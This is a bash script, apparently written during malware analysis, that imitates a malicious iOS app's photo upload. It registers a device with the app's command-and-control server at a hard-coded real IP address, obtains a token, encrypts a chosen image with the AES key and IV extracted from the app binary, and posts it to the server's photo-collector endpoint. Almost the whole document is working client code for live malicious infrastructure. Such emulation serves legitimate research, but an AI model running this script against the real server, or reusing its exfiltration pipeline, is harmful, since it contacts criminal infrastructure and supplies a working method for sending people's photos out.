#!/usr/bin/env bash
# ios_mimic_upload_target4.sh – mimic the malicious iOS app's photo upload (target4).
# --------------------------------------------------------------
# Usage:
#   ./ios_mimic_upload_target4.sh <photo_path> -i <invite_code> [-u <c2_base_url>]
#
#   <photo_path>   Path to the image you want to exfiltrate.
#   -i <code>      4‑ or 6‑digit invite code (must match the app's expectation).
#   -u <url>       Base URL of the C2 server (default http://66.212.59.162).
# --------------------------------------------------------------

set -euo pipefail

# ---------- defaults ----------
BASE_URL="http://66.212.59.162"
INVITE_CODE=""
PHOTO=""

# ---------- parse flags ----------
while [[ "$#" -gt 0 ]]; do
  case "$1" in
    -i)
      INVITE_CODE="$2"
      shift 2
      ;;
    -u)
      BASE_URL="$2"
      shift 2
      ;;
    *)
      if [[ -z "$PHOTO" ]]; then
        PHOTO="$1"
      else
        echo "Unexpected extra argument: $1" >&2
        exit 1
      fi
      shift
      ;;
  esac
done

# ---------- sanity checks ----------
if [[ -z "$PHOTO" ]]; then
  echo "Error: missing <photo_path>" >&2
  exit 1
fi
if [[ ! -f "$PHOTO" ]]; then
  echo "Error: file not found – $PHOTO" >&2
  exit 1
fi
if [[ -z "$INVITE_CODE" ]]; then
  echo "Error: invite code required (-i)" >&2
  exit 1
fi
if [[ ! "$INVITE_CODE" =~ ^[0-9]{4,6}$ ]]; then
  echo "Error: invite code must be 4 or 6 digits" >&2
  exit 1
fi

# ---------- 1️⃣ device registration (gets device JWT) ----------
REG_ENDPOINT="/s/qb16jb/l1jrxodp/htxzq8o846"
PHONE="8613800138000"   # dummy phone – any valid MSISDN works
REG_RESP=$(curl -s -X POST \
        -H "Content-Type: application/json" \
        -d "{\"phone\":\"$PHONE\",\"invite_code\":\"$INVITE_CODE\"}" \
        "$BASE_URL$REG_ENDPOINT")
DEVICE_JWT=$(printf "%s" "$REG_RESP" | python3 - <<'PY'
import sys, json
text = sys.stdin.read().strip()
try:
    obj = json.loads(text)
    print(obj.get('token') or (obj.get('data') or {}).get('token') or '')
except Exception:
    # Not JSON (or badly formed) – print nothing, caller will show raw response
    print('')
PY
)
if [[ -z "$DEVICE_JWT" ]]; then
  echo "Failed to obtain device JWT. Server response:" >&2
  echo "$REG_RESP" >&2
  exit 1
fi

echo "[+] Device JWT obtained"

# ---------- 2️⃣ encrypt the photo ----------
# AES‑128‑CBC key & IV extracted from the binary (target4/App.framework/App)
AES_KEY="j8ata8SXS4yHS4yH"                       # 16‑byte ASCII key
AES_IV_HEX="e87579c11079f43dd824993c2cee5ed3"   # 16‑byte IV in hex
# Convert hex IV to raw binary for openssl
IV_BIN=$(echo "$AES_IV_HEX" | xxd -r -p)
# Temporary encrypted file
ENC_FILE=$(mktemp)
# OpenSSL expects key and IV as hex strings; we convert the ASCII key to hex
KEY_HEX=$(echo -n "$AES_KEY" | xxd -p)
openssl enc -aes-128-cbc -K "$KEY_HEX" -iv "$AES_IV_HEX" -in "$PHOTO" -out "$ENC_FILE"

# ---------- 3️⃣ pick a photo‑collector pipeline ----------
# Any of the 8 /s/... paths works; we use the first one listed for photos
UPLOAD_PATH="/s/ac0yci/inmxv1ax/1o70lqn83z"

# ---------- 4️⃣ POST the encrypted payload ----------
UPLOAD_RESP=$(curl -s -X POST \
    -H "Authorization: Bearer $DEVICE_JWT" \
    -H "Content-Type: application/octet-stream" \
    --data-binary "@$ENC_FILE" \
    "$BASE_URL$UPLOAD_PATH")

# Clean up encrypted temp file
rm -f "$ENC_FILE"

# ---------- output ----------
echo "Server reply:" 
echo "$UPLOAD_RESP"
